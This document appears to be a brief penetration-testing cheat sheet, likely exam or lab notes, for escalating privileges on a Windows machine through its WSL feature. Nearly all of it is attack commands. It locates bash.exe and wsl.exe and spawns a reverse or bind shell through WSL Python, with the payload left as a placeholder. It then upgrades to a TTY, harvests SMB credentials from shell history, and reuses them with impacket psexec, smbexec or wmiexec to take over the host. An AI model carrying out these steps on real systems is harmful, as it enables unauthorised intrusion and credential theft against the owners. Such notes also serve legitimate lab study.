We are going to escalate the privilege of a windows machine using the WSL Feature.

```sh
# We are in Victim windows machine now.
# let's have a ceck on system if wsl is being used in the system

# Check if bash.exe is in the system

> where /R c:\windows bash.exe
# Path to the bash.exe file will be given as poutput if its existing

# Check if wsl.exe is on system
> where /R c:\windows wsl.exe
> # Path to the wsl.exe file will be given as poutput if its existing

# Lets check the user privilege of user in wsl
> <path to wsl.exe> <command: whoami>

lets try to get a shell using the wsl.exe
> wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
# sometimes wont work. Better method below

# Better Method using bash.exe
> <path to bash.exe>
# bash.exe will bring up a bash command prompt
>>
>> whoami
>> hostname
# now we have accessed root prvilege of the user in wsl linux system.
# Still we are not in a tty shell. so we have to pop it out using python

# To spwan a tty shell use https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html
>> python -c 'import pty; pty.spawn("/bin/sh")'
# Now we have a tty shell.

# Do some linux system enumeration and you will get something sensitive to explore

>> pwd
>> ls -la
>> uname 
>> history

# Find some sensitive information which we can use to login to the windows system as root and hence we will get root privilege

# in the sample machine. we got smb credentials from history enumeration and used psexec from impacket to gain the root access in to the base windows machine.
# if psexec is failed, try smbexec or wmiexec


```